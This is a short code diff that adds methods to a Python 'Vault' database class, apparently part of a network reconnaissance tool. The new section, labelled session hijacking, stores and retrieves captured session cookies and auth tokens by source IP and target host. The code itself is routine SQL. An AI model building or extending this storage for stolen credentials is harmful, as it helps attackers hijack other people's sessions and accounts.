@@ -269,3 +269,25 @@ class Vault:
             "UPDATE network_devices SET open_ports = ? WHERE mac_address = ?",
             (ports_json, mac)
         )
+
+    # --- Credentials (Session Hijacking) ---
+    def insert_credential(self, src_ip: str, target_host: str, cred_type: str, cred_value: str, raw_header: str = None):
+        """Stores a captured session cookie or auth token."""
+        query = """
+        INSERT INTO credentials (src_ip, target_host, cred_type, cred_value, raw_header)
+        VALUES (?, ?, ?, ?, ?)
+        """
+        self._execute(query, (src_ip, target_host, cred_type, cred_value, raw_header))
+
+    def get_credentials(self, src_ip: str = None, limit: int = 100) -> list:
+        """Retrieves captured credentials, optionally filtered by IP."""
+        if src_ip:
+            query = "SELECT * FROM credentials WHERE src_ip = ? ORDER BY timestamp DESC LIMIT ?"
+            params = (src_ip, limit)
+        else:
+            query = "SELECT * FROM credentials ORDER BY timestamp DESC LIMIT ?"
+            params = (limit,)
+        
+        cursor = self.conn.cursor()
+        cursor.execute(query, params)
+        return [dict(row) for row in cursor.fetchall()]
